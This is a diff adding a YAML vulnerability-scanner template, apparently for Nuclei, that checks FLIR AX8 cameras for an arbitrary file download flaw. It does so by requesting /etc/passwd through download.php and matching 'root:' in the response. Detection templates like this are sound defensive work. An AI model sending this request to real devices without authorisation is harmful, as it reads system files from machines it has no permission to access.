@@ -1,0 +1,26 @@
+id: flir-ax8-download-php-anyfile-download
+info:
+  name: FLIR AX8 download.php Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download.php?file=/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
